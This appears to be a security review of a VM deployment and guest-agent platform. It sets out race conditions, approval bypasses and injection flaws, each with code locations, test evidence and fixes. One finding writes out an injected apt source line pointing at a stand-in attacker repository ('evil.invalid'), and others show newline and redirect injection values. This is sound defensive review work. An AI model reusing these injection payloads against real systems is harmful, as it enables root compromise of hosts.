## High

### H1. A timed-out deployment job keeps running as an orphan executor. CONFIRMED
- **Where:** `ics/ics/actions.py:785-788` (`t.join(job_timeout_seconds)`; on timeout only `cancelled.set()` and the job is finalized `failed`); `ics/ics/deploy/executor.py:270-320` (each step commits in its own session and only checks `jobs.cancel_requested`); `ics/ics/deploy/executor.py:58` (`request_cancel` only matches `status IN ('queued','running')`); `config.py:51` `job_timeout_seconds = 180`.
- **Evidence:** `test_p_job_timeout_leaves_zombie_executor`: timeout 1 s, enrollment 1.5 s/VM. Output: `job status: failed JobTimeout provider calls at fail: 7 after 8s: 9` - provider mutations continue after the job is reported failed.
- **Failure scenario:** a real create (clone + 600 s enrollment wait + installs) always exceeds 180 s. The job turns `failed`, the deployment stays `provisioning`, and the daemon thread keeps cloning/configuring/starting VMs with nobody able to stop it (cancel no longer matches; the doc's advice "re-submit continues" makes it worse). `_pre_create` accepts `provisioning`, so a re-submitted create starts a second executor on the same deployment: both see no `provider_ref` and no tagged guest yet and clone the same VM twice; `job_steps` rows of the old job keep changing under a "failed" job. Same for change/destroy (destroy keeps destroying after "failure").
- **Minimal fix:** deployment actions must not run under the generic wall clock: give `deployment.*` their own budget (or none) with a lease heartbeat renewed per step; on timeout, set `jobs.cancel_requested = true` *before* finalizing and have `run_steps` also stop when `jobs.status <> 'running'`; refuse `deployment.create/change/destroy` prechecks while any job for the deployment is not finished (or a `deployments.lock_job_id`).

## Medium

### M1. Last-admin guard can be bypassed with two approved plans. CONFIRMED
- **Where:** `actions.py:876-886` `_exec_user_set_role` (no last-admin check at execution); `actions.py:906-911` `_exec_user_disable` (locks only the target row; `_active_admins_except` counts uncommitted/unlocked peers); guard exists only at plan time `actions.py:467-494`.
- **Evidence:** `test_p_last_admin_guard_bypass`: admins `adm1`, `adm2`; `adm2` requests disable `adm1`, `adm1` requests demote `adm2` to viewer (both pass precheck), both approved by two approvers. Output: `jobs: [('user.disable', 'succeeded'), ('user.set_role', 'succeeded')] active admins: 0`.
- **Failure scenario:** two admins in a dispute (or one compromised admin plus social engineering of approvers who each see an innocuous plan) lock the organisation out of user management; recovery needs host CLI. Concurrent workers make the disable+disable variant possible too.
- **Minimal fix:** in every executor that can reduce the admin set (`set_role` away from admin, `disable`), `SELECT ... FROM users WHERE role='admin' AND enrolled AND NOT disabled FOR UPDATE` (lock all admins) and re-check `count - target >= 1` before writing.

### M2. Destroy executes "the latest destroy revision", built from an unapplied plan. CONFIRMED
- **Where:** `deploy/ops.py:217-218` (`kind IN ('create','change') ORDER BY revision DESC` - includes `proposed`/`failed` change revisions); `deploy/ops.py:346` (`_load_revision(..., "destroy", None)` - no plan hash; `DeploymentDestroy` has no `plan_hash`); `ops.py:351` marks *all* resources removed.
- **Evidence:** `test_p_destroy_built_from_unapplied_change`: active `medium` deployment; a change that drops the office VM is only *proposed*; then destroy is planned/approved/run. Output: `still running after destroy: ['acme-prod-office'] deployment status: destroyed`.
- **Failure scenario:** a customer VM with mailbox/file data keeps running (and billing, exposed ports) with no deployment resource tracking it (state `removed`, drift skips removed rows). Also, approvers of destroy plan A can end up executing a later destroy revision B with a different VM list.
- **Minimal fix:** build the destroy plan from the **applied** revision (`status='applied'`, `revision = current_revision`) plus all resources with a `provider_ref` and state not `removed`; add `plan_hash` to `DeploymentDestroy` (returned by a destroy preview) and load the revision by it, as create/change do.

### M3. Carried-over steps from a different create plan. CONFIRMED
- **Where:** `deploy/executor.py:29-47` (`seed_steps` matches `deployment_id, revision, step_key, status='succeeded'`); `deploy/ops.py:170` (every create is revision 1).
- **Evidence:** `test_p_carry_over_across_different_create_plans`: create(users=40) fails at health verification; a new create(users=50) with a new plan hash is approved and **succeeds**, but the VMs keep plan 1's memory (`files 4288` vs wanted `4448`, etc.), and the deployment is `active` with `users: 50`.
- **Failure scenario:** the second plan is what the approvers approved (e.g. "re-plan with the patched image digest"), but `comp.install:*` steps carried over from the first job are skipped: the old (possibly vulnerable) digest keeps running while the record says the new one. Approval no longer equals execution.
- **Minimal fix:** store `plan_hash` (or a hash of the step's params) in `job_steps` and carry over only when it matches; or allocate a new revision number per distinct create plan hash.

### M4. apt `sources.list` line injection via `OuRepo.components`. CONFIRMED (render), latent
- **Where:** `ics/ics/guest/cloudinit.py:43` (`components: list[str]`, no validator), `:279` (joined into the `deb` line). The root helper trusts this file: `agent/ou_agent/guesthelper.py:220-249` (`Dir::Etc::sourcelist`), and the key-pin check `_keyring_fingerprints` only covers `/etc/ou-agent/apt/keyrings`.
- **Evidence:** `probe_cloudinit.py`: `components=["main\ndeb [trusted=yes] http://evil.invalid/ubuntu noble main"]` renders a second, `trusted=yes` source line in `/etc/ou-agent/apt/sources.list`. `trusted=yes` overrides `AllowUnauthenticated=false`.
- **Failure scenario:** once the engine fills GuestSpec from operator/catalog configuration, whoever controls that string gets root code execution on every guest via an allowlisted package name served unsigned by their repo (maintainer scripts run as root). The design claim "the key is pinned by fingerprint" fails silently.
- **Minimal fix:** `components: list[Annotated[str, Field(pattern=r"^[a-z0-9][a-z0-9-]{0,30}$")]] (max 8)`; in the helper, refuse a `sources.list` containing `trusted=` or any line not carrying `signed-by=` of a pinned keyring. (Note also that the Ubuntu archive lines in that file let `pkg.install_pinned` resolve allowlisted names from the distro archive, outside the pinned key.)

### M5. Stale change plans execute against a newer applied revision. PLAUSIBLE
- **Where:** `deploy/ops.py:311-337` (`exec_change` checks only `dep.status in (active, changing)`; `rev.diff` was computed against the revision applied at plan time and is not hash-bound - `_verify_integrity` hashes `plan`, not `diff`); `_upsert_revision` `ON CONFLICT ... DO UPDATE SET diff=...` (`ops.py:179`) can also rewrite the diff of an existing row.
- **Failure scenario:** two normal-risk changes A and B are approved against R1; A runs (R2, e.g. adds a VM); B then runs R1->B steps and sets `desired_spec`/`current_revision` to B: A's VM is neither in B's plan nor removed (orphan with state `present`), and B's checks/sizing are computed without A.
- **Minimal fix:** store `base_revision` and `diff_hash` in the revision, include them in the hash check, and refuse at execution when `dep.current_revision != base_revision` ("re-preview").

## Low

- **L1. Trailing newline accepted by `re.match(...$)`. CONFIRMED.** `agent/ou_agent/guestspec.py:18-31,41-44` (`_s` uses `rx.match`), `:114` forbidden-prefix test; `ics/ics/guest/cloudinit.py:24-30,104-170`. `probe_guestspec.py`: volume path `"/etc\n"` with `read_only: true` is accepted and renders `Volume=ou-mail-data.volume:/etc` + a stray `:ro` line (mount over the container's `/etc`, read-write); component `"mail\n"` yields files `ou-mail\n.network`, `ou-mail\n-web.container`. Only one trailing `\n` is possible, so no new `Key=` directive can be formed (exploitability is limited to a signed ICS request), but the module's "no user value can add a line" invariant is false. ICS side: hostname `"gw-app1\n"` accepted. **Fix:** `rx.fullmatch` (or `\Z`) everywhere in both validators; reject any `\n`/`\r` in rendered values in `render()` as a backstop.
- **L2. Self-minted maintenance window downgrades disruptive changes. CONFIRMED (by code).** `deploy/ops.py:196-201,317-321`, `actions.py:580` (check-scoped window <= 60 min is `low`, auto-approved). **Fix:** require the window to be created by someone other than the change requester, or scoped to the deployment, or simply make disruptive changes `high` unless the window was approved by a second person.
- **L3. Destroy/power ownership check is name-based. PLAUSIBLE.** `deploy/executor.py:176-186`, `:150-175`. If the recorded vmid is reused by another guest after out-of-band deletion while a same-name tagged guest exists, the wrong VM is destroyed. **Fix:** destroy/power/snapshot/resize only if the guest found by `_find_guest` has `g.vmid == ref.vmid` (and the provider re-checks tags on the vmid itself).
- **L4. Check name collisions. PLAUSIBLE.** `deploy/ports.py:89-92`, `deploy/ops.py:352-353`. **Fix:** key deployment checks by `(deployment_id, name)` (column or `created_by_deployment`), never adopt or disable a check the deployment did not create.
- **L5. `user.revoke_invite` on accounts in recovery. CONFIRMED (by code).** `actions.py:299` (`low`), `:477-479`; `auth.py:80-93`. **Fix:** risk = high when the target role is privileged or the account was ever enrolled (`audit user.enrolled` exists / `role_set_at`), plus the last-admin guard.
- **L6. Portal flow eviction. CONFIRMED.** `portal/app/sessions.py:54-58`. `probe_portal.py`: after 2001 `/login` flows the victim's flow is gone. **Fix:** stateless flow (state, nonce, verifier sealed/HMAC'd in the `__Host-` flow cookie) or per-IP flow quotas.
- **L7. `safe_next` control characters.** `portal/app/main.py:28-32`. Output: `'/\t/evil.example' -> Location: /%09/evil.example` (safe only through Starlette's quoting). **Fix:** reject any char `< 0x21` or `0x7f`, and require `urlsplit(p).netloc == ''`.
- **L8. Directory detail to viewers.** `ics/ics/userdir.py:79-89,96-110,131-136`: lockout ("locked") state, `mfa_enrolled`, session counts, `last_login_at`, and role-change justifications are viewer-visible. Acceptable per ADR (directory is viewer+), but lockout state tells a viewer whose account is under attack; consider admin-only for `locked`, sessions and justifications.
- **L9. Quadlet re-pull bypasses the root signature policy.** `agent/ou_agent/guestspec.py:202` (`Image=` without `Pull=never`). **Fix:** emit `Pull=never` so a missing image fails closed until `podman.pull_verified` runs again.

## Verified sound (no finding)

- **No provider mutation outside the executor.** `ics/ics/providers/` contains only `base.py` (no concrete provider); provider verbs are called only from `deploy/executor.py` via `ExecEnv`; `deployments/plan`, `changes/preview`, `drift` and all `GET`s are read-only (test asserts zero rows written). Drift is report-only (`state.drift_findings`; unexpected tagged guests are never touched).
- **Approvals.** `deployment.*` go through `create_plan` -> `decide_plan` -> `_verify_approval` (digest over params re-checked at execution, distinct approvers, requester excluded, provenance rule). create/change bind `plan_hash`; the plan is regenerated at precheck and the stored plan's hash re-verified before execution (`_verify_integrity`). Risk: create/destroy high; change high on removal/shrink/override.
- **Spec injection at the ICS boundary.** `PlanInput`/`ChangeSet`/`VmLayout` are `extra="forbid"` pydantic models with Rust-regex patterns (anchored, no trailing-newline issue); free-form fields like `image` are rejected (tested). Images, ports, volumes, digests come only from the repo catalog, which is validated (`catalog.py`). SQL is parameterised everywhere; the f-string `UPDATE`s use constant column names.
- **Quadlet/agent:** closed schema, no args/privileged/devices/host paths; `NoNewPrivileges`, `DropCapability=ALL`, `%`/space/quote excluded from env values; image must be `registry/repo@sha256:<64hex>` from an allowlisted registry (tag/digest confusion refused; pulled digest compared to the pin; `--signature-policy` points at the root-owned default-reject `sigstoreSigned` policy with `matchRepository`). Helper re-validates the spool against root-owned `agent.json`, spool opened `O_NOFOLLOW`, rid `^r[0-9a-f]{16}$`; result dirs are root/ou-svc-owned `RuntimeDirectory` (agent cannot plant symlinks); podman family runs as `ou-svc`, only pkg as root; polkit rule allows `start` of exactly `ou-rb-<allowlisted>@<instance>.service` and `restart` of allowlisted units; argv-only subprocess calls.
- **cloud-init:** YAML via `yaml.safe_dump`; bootstrap values `shlex.quote`d; nftables from `ipaddress`-normalised CIDRs; SSH key regex excludes options; bundle hash-verified before extraction. **Enrollment token:** only its SHA-256 reaches user-data/guest; agent compares in constant time, throttles per source, deletes `enroll.json` on success; ICS-side enrollment pins TLS + agent key fingerprints before sending the token. User-enrollment tokens are never returned by the API (`userdir` exposes only `has_token`).
- **User directory:** `last_login_ip`, per-event IPs and session details admin-only (tested); failed-login reasons not shown (those events carry no `actor_id`); invite-revoke vs enrollment race is safe (`FOR UPDATE` on both sides, token hash nulled); target user can never decide plans on their own account; `user.*` are admin-only to request.
- **Monitoring fixes (M1-M4, Lows):** remediation per-(node,unit) budget, terminal escalation, wall-clock check deadlines (`checks.py:57`), stale remediation superseded at approval and before job start, `_silencing_risk` (global/long windows high, disable normal, ack bursts normal), agent handshake off the accept thread - covered by the passing `test_review_fixes.py`/`test_security_review.py`; no regression found in the touched code.
- **Portal:** code + PKCE S256 + nonce + `state` bound to a `__Host-` flow cookie (login CSRF), single-use flows with 10-min TTL; ID token verified (JWKS kid, RS/ES/PS256 only, iss/aud/exp/iat/sub required, nonce, azp); discovery issuer checked; redirect URI fixed from config; fresh random session id on every login (no fixation); tokens server-side only; `__Host-`, Secure, HttpOnly, SameSite=Lax cookies; CSRF token + Origin check on every POST; logout is POST+CSRF and uses `id_token_hint` + fixed `post_logout_redirect_uri`; strict CSP without script; `Cache-Control: no-store`; mobileconfig via `plistlib` and autoconfig via `xml.sax.saxutils.escape` (no injection; no credentials in profiles); file links rebuilt on the configured files host.
- **Console frontend:** no `v-html`/`innerHTML`/`eval`; all dynamic links are `'#' + ...` hash routes (no `javascript:`); session is the HttpOnly cookie, CSRF token kept in memory and sent only on non-GET same-origin fetches; `localStorage` holds only the theme; CSP `script-src 'self'; style-src 'self'` with no inline script (dynamic `:style` uses CSSOM, unaffected).
